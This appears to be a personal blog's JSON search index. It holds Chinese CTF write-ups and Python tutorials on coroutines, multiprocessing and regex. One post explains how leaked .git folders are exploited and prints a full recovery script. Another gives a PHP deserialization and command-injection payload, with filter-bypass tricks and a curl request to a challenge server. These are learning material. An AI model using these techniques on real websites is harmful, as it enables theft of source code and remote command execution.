{"meta":{"title":"夏了茶糜","subtitle":"","description":"","author":"夏了茶糜","url":"https://xin02.github.io","root":"/"},"pages":[{"title":"关于","date":"2022-07-01T12:29:49.837Z","updated":"2022-07-01T12:29:49.834Z","comments":false,"path":"about/index.html","permalink":"https://xin02.github.io/about/index.html","excerpt":"","text":"如果对本博客文章有任何疑问，可发送邮件至 sxin0807#qq.com (#替换为@即为邮箱地址)与我讨论。"},{"title":"404 Not Found：该页无法显示","date":"2022-07-01T12:29:49.874Z","updated":"2022-07-01T12:29:49.872Z","comments":false,"path":"/404.html","permalink":"https://xin02.github.io/404.html","excerpt":"","text":""},{"title":"分类","date":"2022-07-01T12:29:49.527Z","updated":"2022-07-01T12:29:49.526Z","comments":false,"path":"categories/index.html","permalink":"https://xin02.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-07-01T12:29:49.636Z","updated":"2022-07-01T12:29:49.634Z","comments":true,"path":"links/index.html","permalink":"https://xin02.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-07-01T12:29:49.410Z","updated":"2022-07-01T12:29:49.408Z","comments":false,"path":"tags/index.html","permalink":"https://xin02.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Git信息泄露原理解析及利用总结","slug":"Git信息泄露原理解析及利用总结","date":"2022-12-19T13:02:24.000Z","updated":"2022-12-19T13:03:21.761Z","comments":true,"path":"2022/12/19/Git信息泄露原理解析及利用总结/","link":"","permalink":"https://xin02.github.io/2022/12/19/Git%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"git信息泄露 git基础知识介绍 目录结构 .git目录：使用git init初始化git仓库的时候，生成的隐藏目录，git会将所有的文件，目录，提交等转化为git对象，压缩存储在这个文件夹当中。 COMMIT_EDITMSG：保存最新的commit message，Git系统不会用到这个文件，用户的一个参考文件 config：Git仓库的配置文件 description：仓库的描述信息，主要给gitweb等git托管系统使用 HEAD：HEAD 文件指示目前被检出的分支,本地仓库 当前引用 hooks：这个目录存放一些shell脚本，可以设置特定的git命令后触发相应的脚本；在搭建gitweb系统或其他git托管系统会经常用到hook script(钩子脚本) index：暂存区文件，是一个二进制文件 (git ls-files)，当使用git add命令添加文件时，将文件名以及文件内容存储的文件名等信息写入到.git/index文件中 info：信息文件夹. 包含一个全局性排除文件，可以配置文件忽略 logs：保存所有更新的引用记录,保存日志信息 objects：所有的Git对象都会存放在这个目录中，对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名，并将文件内容通过zlib进行压缩存储。下图展示了文件压缩存储位置，解压文件内容等信息 refs：这个目录一般包括三个子文件夹，heads、remotes和tags，heads中的文件标识了项目中的各个分支指向的当前commit ORIG_HEAD：远程仓库 当前引用 参考文档 Git仓库.git文件夹目录介绍_songyuequan的博客-CSDN博客_git 目录 【Git】Git目录中各个文件（文件夹）的说明_敦厚的曹操的博客-CSDN博客_git 文件存放位置 【Git】探秘Git的.git中几个重要的文件夹_李易安QSR的博客-CSDN博客_.git文件夹 GIT常用命令 1234567891011121314151617181920git init 初始化一个git仓库git add &amp;&amp; git commit //git 添加文件和提交文件git status 查看当前仓库状态和内存状态git ls-files -u 显示冲突的文件，-s是显示标记为冲突已解决的文件git diff 对比工作区和stage文件的差异git diff -cached 对比stage和branch之间的差异git ls-files -stage 检查保存在stage的文件git log 显示到HEAD所指向的commit为止的所有commit记录git reset -hard HEAD放弃工作区和index的改动，HEAD指针仍然指向当前的commit--hard：(1) 要放弃目前本地的所有改变時，即去掉所有add到暂存区的文件和工作区的文件，可以执行 git reset -hard HEAD 来强制恢复git管理的文件夹的內容及状态；(2) 真的想抛弃目标节点后的所有commit（可能觉得目标节点到原节点之间的commit提交都是错了，之前所有的commit有问题）。--soft：原节点和reset节点之间的【差异变更集】会放入index暂存区中(Staged files)，所以假如我们之前工作目录没有改过任何文件，也没add到暂存区，那么使用reset --soft后，我们可以直接执行 git commit 將 index暂存区中的內容提交至 repository 中。为什么要这样呢？这样做的使用场景是：假如我们想合并「当前节点」与「reset目标节点」之间不具太大意义的 commit 记录(可能是阶段性地频繁提交,就是开发一个功能的时候，改或者增加一个文件的时候就commit，这样做导致一个完整的功能可能会好多个commit点，这时假如你需要把这些commit整合成一个commit的时候)時，可以考虑使用reset --soft来让 commit 演进线图较为清晰。总而言之，可以使用--soft合并commit节点。--mixed（默认）：(1)使用完reset --mixed后，我們可以直接执行 git add 将這些改变果的文件內容加入 index 暂存区中，再执行 git commit 将 Index暂存区 中的內容提交至Repository中，这样一样可以达到合并commit节点的效果（与上面--soft合并commit节点差不多，只是多了git add添加到暂存区的操作）；(2)移除所有Index暂存区中准备要提交的文件(Staged files)，我们可以执行 git reset HEAD 来 Unstage 所有已列入 Index暂存区 的待提交的文件。(有时候发现add错文件到暂存区，就可以使用命令)。(3)commit提交某些错误代码，或者没有必要的文件也被commit上去，不想再修改错误再commit（因为会留下一个错误commit点），可以回退到正确的commit点上，然后所有原节点和reset节点之间差异会返回工作目录，假如有个没必要的文件的话就可以直接删除了，再commit上去就OK了。git reset HEAD^ 回退到上一版本git reset HEAD file拉取最近一次提交到版本库的文件到暂存区 该操作不影响工作区git checkout -- &lt;file&gt; 拉取暂存区文件 并将其替换成工作区文件git ls-files 查看暂存区文件git ls-files -s 查看文件对应的Blob对象 参考文档 Git 参考手册 (justjavac.com) Git - Book (git-scm.com) git信息泄露危害 通过目录结构中介绍objects文件的相关说明，可以知道一旦这个.git文件夹泄露，我们就可以通过zlib解压的方式获取到网站的相关源码等信息，进而进行代码审计等操作。 判断是否存在git信息泄露漏洞 ①可以先观察一下站点是否有醒目地指出Git，如果有的话，那就说明站点很大可能是存在这个问题的 ②如果站点没有醒目的提示的话，可以利用dirsearch、御剑等Web目录扫描工具，如果存在./git泄露的问题的话，会被扫描出来的 ③最直观的方式，就是直接通过网页访问.git目录下的相关文件如：index、HEAD，如果能访问就说明存在 git常规泄露 即不需要其他任何操作，通过运用现成的工具或自己编写的脚本即可获取网站源码或者flag。这里推荐一个工具: https://github.com/denny0223/scrabble 源码（bash脚本）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/bin/bash## Author: Denny Huang &lt;denny0223@gmail.com&gt;# Wed Sep 17 2014# MIT Licensefunction downloadBlob &#123; echo downloadBlob $1 mkdir -p $&#123;1:0:2&#125; cd $_ wget -q -nc $domain/.git/objects/$&#123;1:0:2&#125;/$&#123;1:2&#125; cd ..&#125;function parseTree &#123; echo parseTree $1 downloadBlob $1 while read line do type=$(echo $line | awk &#x27;&#123;print $2&#125;&#x27;) hash=$(echo $line | awk &#x27;&#123;print $3&#125;&#x27;) [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash done &lt; &lt;(git cat-file -p $1)&#125;function parseCommit &#123; echo parseCommit $1 downloadBlob $1 tree=$(git cat-file -p $1| sed -n &#x27;1p&#x27; | awk &#x27;&#123;print $2&#125;&#x27;) parseTree $tree parent=$(git cat-file -p $1 | sed -n &#x27;2p&#x27; | awk &#x27;&#123;print $2&#125;&#x27;) [ $&#123;#parent&#125; -eq 40 ] &amp;&amp; parseCommit $parent&#125;[ -z $1 ] &amp;&amp; echo -e &quot;missing target url\\n\\n\\Usage: scrabble &lt;url&gt;\\n\\Example: scrabble http://example.com/\\n\\n\\You need make sure target url had .git folder&quot;\\&amp;&amp; exitdomain=$1ref=$(curl -s $domain/.git/HEAD | awk &#x27;&#123;print $2&#125;&#x27;)lastHash=$(curl -s $domain/.git/$ref)git initcd .git/objects/parseCommit $lastHashcd ../../echo $lastHash &gt; .git/refs/heads/mastergit reset --hard 使用方法： 12345A simple tool to recover .git folder on remote server.Usage: scrabble &lt;url&gt;Example: scrabble http://example.com/You need to make sure target URL has .git folder. git回滚 git作为一个版本控制工具，会记录每次提交(commit）的修改，所以当题目存在git泄露时，flag(敏感）文件可能在修改中被删除或被覆盖了，这时我们可以利用git 的“git reset”命令来恢复到以前的版本。 此处直接在本地模拟从Web服务器上读取到的文件 首先可以通过”git log –stat”命令查看每个commit修改了哪些文件，再用“git diffHEAD commit-id”比较在当前版本与想查看的commit之间的变化。 或者通过”git reset –hard HEAD^”恢复到上一个版本。此处注意这是Linux版本写法，Windows要使用”git reset –hard HEAD^^”。这是因为在Windows “^” 被作为换行。 git分支 在每次提交时，git都会自动把它们串成一条时间线，这条时间线就是一个分支。而 git允许使用多个分支，从而让用户可以把工作从开发主线上分离出来，以免影响开发主线。如果没有新建分支，那么只有一条时间线，即只有一个分支，git中默认为master分支。因此，我们要找的flag或敏感文件可能不会藏在当前分支中，这时使用“git log”命令只能找到在当前分支上的修改，并不能看到我们想要的信息，因此需要切换分支来找到想要的文件。现在大多数现成的 git泄露工具都不支持分支，如果需要还原其他分支的代码，往往需要手工进行文件的提取，这里以功能较强的GitHacker ( https://github.com/WangYihanGitHacker）工具为例。GitHacker的使用十分简单，只需执行命令“python GitHacker http://127.0.0.1:8000/.git”。运行后，我们会在本地看到生成的文件夹，进入后执行“git log –all”或“git branch -v”命令，只能看到master 分支的信息。如果执行“git reflog”命令，就可以看到一些checkout的记录。可以通过git checkout fenzhimin 切换分支。 git其他可用信息 除了查看源码的常见利用方式，泄露的git中也可能有其他有用的信息，如 .git/config 文件夹中可能含有access_token信息，从而可以访问这个用户的其他仓库。 本文参考：从0到1：ctfer的成长之路","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/tags/CTF/"},{"name":"GIT","slug":"GIT","permalink":"https://xin02.github.io/tags/GIT/"}]},{"title":"unseping","slug":"unseping","date":"2022-11-06T12:10:23.000Z","updated":"2022-11-06T14:00:32.678Z","comments":true,"path":"2022/11/06/unseping/","link":"","permalink":"https://xin02.github.io/2022/11/06/unseping/","excerpt":"","text":"1、题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phphighlight_file(__FILE__);class ease&#123; private $method;//ping private $args;//array(&#x27;&#x27;) function __construct($method, $args) &#123;//创建对象时触发 $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123;//对象销毁时触发 if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;//如果ping匹配数组里有ping进入if //这个决定了 $a = new ease(&quot;ping&quot;,array(&#x27;pwd&#x27;));的第一个参数ping //下面的函数也决定了第二个参数是 数组型array(&#x27;&#x27;) call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); //调用回调函数，并把一个数组参数作为回调函数的参数 //被调用的函数 this之这个类 method 就是函数ping 参数是args //只针对php // call_user_func_array(array($ease,&quot;ping&quot;),array(&#x27;one&#x27;)); &#125; &#125; function ping($ip)&#123;//等于执行了ping(&quot;one&quot;) //ping的参数只有一个因此数组传一个参就好了 exec($ip, $result); var_dump($result);//貌似执行了这个$ip命令返回了结果 &#125; function waf($str)&#123; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array)) &#123; //正则表达式()整体修饰|或&amp;或;或 或/或cat或flag或tac或php或ls 这都是liunx常用的一些执行命令 return $str;//绕过表达式 返回传参 &#125; else &#123; echo &quot;don&#x27;t hack&quot;; &#125; &#125; function __wakeup()&#123;//执行unserialize()时，先会调用这个函数 foreach($this-&gt;args as $k =&gt; $v) &#123;//遍历关联数组 foreach ($array as $key =&gt; $value) $this-&gt;args[$k] = $this-&gt;waf($v);//调用waf函数输入$v //若果绕过waf本身的args不会变 &#125; &#125; &#125;$ctf=@$_POST[&#x27;ctf&#x27;];//post传参ctf=xxxx@unserialize(base64_decode($ctf));//先对ctf进行base64解密 在反序列话//unserialize先检查__wakeup()存在的意义：常常初始化操作 或 连接数据库/*(前提：有可利用的类）常见的魔术方法__construct() //创建对象时触发__destruct() //对象销毁时触发__call() //在对象中调用不可访问的方法时触发__callStatic() //在静态中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数*/?&gt; 2、函数解释highlight_filehighlight_file(filename,return) 函数对文件进行语法高亮显示。 参数 描述 filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码。 __FILE__PHP中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。 __construct()构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。 在 PHP3.0 和 PHP4.0 中，构造函数是一个与其所在类同名的函数。而在 PHP5 中，虽然也支持 PHP3.0 和 PHP4.0 中的用法，但是更推荐使用__construct作为类的构造函数，这样做的好处就是构造函数无需随着类名的改变而做出修改。在 PHP7.0 中废弃了 PHP3.0 和 PHP4.0 中的用法，构造函数必须使用__construct来定义。 构造函数就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。和普通函数类似构造函数也可以带有参数，如果构造函数有参数的话，那么在实例化也需要传入对应的参数。 __destruct()析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。 在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。 析构函数的声明格式与构造函数相似，在类中声明析构函数的名称也是固定的，同样以两个下画线开头的方法名__destruct()，而且析构函数不能带有任何参数。 __sleep__sleep()，执行serialize()时，先会调用这个函数 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意：__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用：__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 __wakeup执行unserialize()时，先会调用这个函数 如果说__sleep 是白的，那么__wakeup() 就是黑的了。 那么为什么呢？ 因为：与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 作用： __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作 in_array(value,array,type)参数说明： value ：要搜索的值 array ： 被搜索的数组 type ： 类型，true全等 ，false非全等(默认) PHP 4, PHP 5中 in_array函数功能 – 检查数组中是否存在某个值。 call_user_func_array(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7, PHP 8) call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数 把第一个参数作为回调函数（callback）调用，把参数数组作（args）为回调函数的的参数传入。 参数 ¶ callback 被调用的回调函数。 args 要被传入回调函数的数组，这个数组得是索引数组。 返回值 ¶ 返回回调函数的结果。如果出错的话就返回 false 。 serialize()serialize() 函数用于序列化对象或数组，并返回一个字符串。 serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。 PHP 版本要求: PHP 4, PHP 5, PHP 7 语法 1string serialize ( mixed $value ) 参数说明： $value: 要序列化的对象或数组。 返回值:返回一个字符串。 unserialize()用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 PHP 版本要求: PHP 4, PHP 5, PHP 7 参数说明： $str: 序列化后的字符串。 返回值: 返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE。 3、解题方法代码过滤了flag，ls，空格等。可以使用反斜杠隔开ls，反斜杠在Linux中可以作为转义符号或作为换行符，也可通过Linux shell脚本中的空的环境变量绕过例如将${a}放在ls中间，${IFS}代替空格。还可以通过将字符转换为8进制的ASCII码绕过检测。例如：$(printf “\\154\\163”)，154为l，163为s 12345┌──(root㉿kali)-[/]└─# $(printf &quot;\\154\\163&quot;)bin etc initrd.img lib32 lost+found opt run sys varboot flag initrd.img.old lib64 media proc sbin tmp vmlinuzdev home lib libx32 mnt root srv usr vmlinuz.old 123456789┌──(root㉿kali)-[~]└─# ls -l\\a \\/home总用量 12drwxr-xr-x 3 root root 4096 2月 28 2022 .drwxr-xr-x 19 root root 4096 9月 1 09:23 ..drwxr-xr-x 17 kk kk 4096 2月 28 2022 kk 1echo base64_encode(serialize(new ease(&quot;ping&quot;,array(&quot;l\\s fl\\ag_1\\s_here&quot;)))); 输出为：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0 通过curl发送post数据 1curl http://61.147.171.105:51434/ -X POST -d &#x27;ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0&#x27; wget：提交方式wget –post-data “item1=value1&amp;item2=value2” http://xxx.xxx.com 12345678910#include &lt;stdio.h&gt;int main()&#123; /* code */ char site[] = &quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;; for (int i = 0; i &lt; sizeof site / sizeof site[0]; i++) &#123; printf(&quot;\\\\%o&quot;,site[i]); &#125; return 0;&#125; 江苏工匠杯_unseping_wp_昵称还在想呢的博客-CSDN博客 GXYCTF2019–Ping Ping Ping_FTOrange的博客-CSDN博客 shell命令之 IFS(内部分隔符的用法)h0ld1rs的博客-CSDN博客$ifs$1 PHP反序列化漏洞简介及相关技巧小结 - FreeBuf网络安全行业门户 CTF中PHP反序列化和命令注入的一次简单利用 | payload (lmlphp.com)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/categories/CTF/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://xin02.github.io/tags/WEB/"},{"name":"反序列化","slug":"反序列化","permalink":"https://xin02.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Python3 面向对象","slug":"Python3-面向对象","date":"2022-07-11T06:10:46.000Z","updated":"2022-07-11T06:12:24.933Z","comments":true,"path":"2022/07/11/Python3-面向对象/","link":"","permalink":"https://xin02.github.io/2022/07/11/Python3-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"https://xin02.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"}]},{"title":"自制操作系统","slug":"自制操作系统","date":"2022-07-11T06:06:02.000Z","updated":"2022-07-11T06:06:22.957Z","comments":true,"path":"2022/07/11/自制操作系统/","link":"","permalink":"https://xin02.github.io/2022/07/11/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Python3 正则","slug":"Python3-正则表达式","date":"2021-08-09T02:36:23.000Z","updated":"2022-07-01T12:29:49.108Z","comments":true,"path":"2021/08/09/Python3-正则表达式/","link":"","permalink":"https://xin02.github.io/2021/08/09/Python3-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"正则表达式 - 简介典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。 通过使用正则表达式，可以： 测试字符串内的模式。 例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。 替换文本。 可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。 基于模式匹配从字符串中提取子字符串。 可以查找文档内或输入域内特定的文本。 例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。 匹配单个字符匹配多个字符匹配开头结尾匹配分组Python3 Re模块高级用法","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://xin02.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"Python3 协程","slug":"Python3-协程","date":"2021-06-18T01:18:14.000Z","updated":"2022-07-01T12:29:49.200Z","comments":true,"path":"2021/06/18/Python3-协程/","link":"","permalink":"https://xin02.github.io/2021/06/18/Python3-%E5%8D%8F%E7%A8%8B/","excerpt":"","text":"迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有元素被访问完结束。迭代器只能往前不会后退。 判断是否可迭代12345678910In [1]: from collections.abc import IterableIn [2]: isinstance(&quot;abc&quot;,Iterable)Out[2]: TrueIn [3]: isinstance([1,2,3],Iterable)Out[3]: TrueIn [4]: isinstance(123,Iterable)Out[4]: False 返回为True即为可迭代 迭代器12345678910111213141516171819202122class Classmate(object): def __init__(self): self.names = list() self.current_num = 0 def add(self,name): self.names.append(name) def __iter__(self): #如果想要一个对象 可以迭代，即可以使用for，那么必须实现__iter__方法 return self def __next__(self): if self.current_num &lt; len(self.names): ret = self.names[self.current_num] self.current_num += 1 return ret else: raise StopIterationclassmate = Classmate()classmate.add(&quot;小1&quot;)classmate.add(&quot;小2&quot;)classmate.add(&quot;小3&quot;)for i in classmate: print(i) 迭代器的应用(斐波那契数列)1234567891011121314151617181920class Fibonacci(object): def __init__(self,max_num): self.max_num = max_num self.current_num = 0 self.front = 0 self.after = 1 def __iter__(self): return self def __next__(self): if self.current_num &lt; self.max_num: ret = self.front self.front, self.after = self.after, (self.front + self.after) self.current_num += 1 return ret else: raise StopIterationfibo = Fibonacci(20)for num in fibo: print(num) 迭代器的其他使用方法并不是只有for循环能够接受可迭代对象，除for循环外，list、tuple等也能接受。 123a = (11,22,33)list(a)#此处list(a)不是单纯的类型转换，而是首先创建一个空列表，然后调用next方法，一个一个的往列表中添加。 生成器生成器是一种特殊的迭代器 创建生成器方法1123456789In [1]: nums = [x*2 for x in range(5)]In [2]: numsOut[2]: [0, 2, 4, 6, 8]In [3]: nums = (x*2 for x in range(5))In [4]: numsOut[4]: &lt;generator object &lt;genexpr&gt; at 0x000001DC00D7AF20&gt; 方法2如果一个函数中，存在yield语句，那么它就不是一个函数而是一个生成器 1234567891011def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: yield a a, b = b, a + b current_num += 1generator = create_num(100)#generator就是一个生成器对象for num in generator: print(num) 生成器也是一个特殊的迭代器(使用next函数访问)123456789101112131415def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: yield a a, b = b, a + b current_num += 1 return &quot;ok ...&quot;generator = create_num(100)for i in range(102): try: print(next(generator)) except StopIteration as e: print(e.value) break send唤醒send与next的区别，send可以向生成器中传参 123456789101112def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: ret = yield a print(ret) a, b = b, a + b current_num += 1 return &quot;ok ...&quot;generator = create_num(100)print(next(generator))print(generator.send(&quot;传参&quot;)) 第一次启动生成器，如果使用send，不能传值。第一次建议使用next，非要使用send，可以传入None这个空值。 使用yield完成多任务1234567891011121314151617181920212223import timedef task_1(): while True: print(&quot;---1---&quot;) time.sleep(0.1) yielddef task_2(): while True: print(&quot;---2---&quot;) time.sleep(0.1) yielddef main(): t1 = task_1() t2 = task_2() while True: next(t1) next(t2)if __name__ == &quot;__main__&quot;: main() 使用greenlet完成多任务安装greenlet 1pip install greenlet greenlet 12345678910111213141516171819import timefrom greenlet import greenletdef test1(): while True: print(&quot;---A---&quot;) gr2.switch() time.sleep(0.5)def test2(): while True: print(&quot;---B---&quot;) gr1.switch() time.sleep(0.5)gr1 = greenlet(test1)gr2 = greenlet(test2)gr1.switch() greenlet已经实现了协程，但是还需要人工切换。gevent可以自动切换 使用gevent完成多任务安装gevent 1pip install gevent 简单实现 123456789101112131415import geventdef f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 gevent.sleep(1)g1 = gevent.spawn(f,5)g2 = gevent.spawn(f,5)g3 = gevent.spawn(f,5)g1.join()g2.join()g3.join() 给程序打补丁monkey.patch_all() 1234567891011121314151617181920import geventfrom gevent import monkeyimport timemonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 time.sleep(1)g1 = gevent.spawn(f,5)g2 = gevent.spawn(f,5)g3 = gevent.spawn(f,5)g1.join()g2.join()g3.join() 简洁写法 1234567891011121314import geventfrom gevent import monkeyimport timemonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 time.sleep(1)gevent.joinall([gevent.spawn(f,5),gevent.spawn(f,5),gevent.spawn(f,5)]) 案例-图片下载器（利用协程提高速度）1234567891011121314151617181920import geventfrom gevent import monkeyimport urllib.requestmonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def download_img(url): req = urllib.request.urlopen(url) with open(url[-8:],&#x27;wb&#x27;) as file: file.write(req.read())def main(): gevent.joinall([ gevent.spawn(download_img,&quot;https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg&quot;), gevent.spawn(download_img,&quot;https://www.venustech.com.cn/u/cms/www/202106/11174004guxu.png&quot;), gevent.spawn(download_img,&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;)])if __name__ == &quot;__main__&quot;: main() 进程、线程、协程对比 进程是资源分配的单位 线程是操作系统调度的单位 进程切换需要的资源很大，效率很低 线程切换需要的资源一般，效率一般（不考虑GIL情况下） 协程切换任务资源很小，效率高 多进程、多线程根据CPU核数不一样可能是并行，但是协程是在一个线程中 所以是并发","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"协程","slug":"协程","permalink":"https://xin02.github.io/tags/%E5%8D%8F%E7%A8%8B/"}]},{"title":"Python3 多进程","slug":"Python3-多进程","date":"2021-06-16T06:38:14.000Z","updated":"2022-07-01T12:29:49.315Z","comments":true,"path":"2021/06/16/Python3-多进程/","link":"","permalink":"https://xin02.github.io/2021/06/16/Python3-%E5%A4%9A%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"什么是进程？ 程序：一个未运行的二进制文件，叫做程序。如Windows下的PE文件 进程：二进制文件运行后，文件本身以及用到的资源称为进程，他是操作系统分配资源的基本单元。 多任务：不止可以通过线程完成多任务，还可以通过进程完成多任务。 使用Process实现多进程123456789101112131415from multiprocessing import Processimport timedef test(test): time.sleep(5) print(&quot;这是&#123;&#125;&quot;.format(test))def main(): p1 = Process(target=test,kwargs=&#123;&quot;test&quot;:&quot;t1&quot;&#125;) p2 = Process(target=test,kwargs=&#123;&quot;test&quot;:&quot;t2&quot;&#125;) p1.start() p2.start()if __name__ == &quot;__main__&quot;: main() 通过队列完成进程间通信12345678910111213141516171819202122232425262728293031from multiprocessing import Queue,Processimport timeimport osdef queue_put(q): for i in range(10): q.put(i) print(&quot;PID:&#123;&#125; ,&#123;&#125; 已存入队列，当前队列共&#123;&#125;个元素&quot;.format(os.getpid(),i,q.qsize())) time.sleep(5)def queue_get(q): for i in range(10): print(&quot;PID:&#123;&#125; ,&#123;&#125; 已取出队列，当前队列共&#123;&#125;个元素&quot;.format(os.getpid(),q.get(),q.qsize())) time.sleep(5)def main(): q = Queue(5)#创建一个队列，队列可以存储5个数据 # q.put(&quot;a&quot;)#向队列中添加数据，如果队列存满，程序会阻塞等待 # q.get()#从队列中获取数据，如果队列为空，程序会阻塞等待 # #q.put_nowait()如果队列存满，程序会报异常 # #q.get_nowait()如果队列为空，程序会报异常 # q.qsize()#取出队列中数据个数 # q.empty()#判断队列是否为空 # q.full()#判断队列是否存满 p1 = Process(target=queue_put,args=(q,)) p2 = Process(target=queue_get,args=(q,)) p1.start() p2.start()if __name__ == &quot;__main__&quot;: main() 进程池12345678910111213141516import hashlibfrom multiprocessing import Pooldef js_hash(s): md5 = hashlib.md5() md5.update(s.encode(&#x27;utf-8&#x27;)) md5 = md5.hexdigest() if &#x27;0e&#x27; == md5[0:2] and md5[2:].isdecimal(): print(s,md5)if __name__ == &#x27;__main__&#x27;: p = Pool(5)#创建一个进程池，最大进程数5 for i in range(0,99999999999999): s = &#x27;0e&#x27; + str(i) p.apply_async(js_hash, 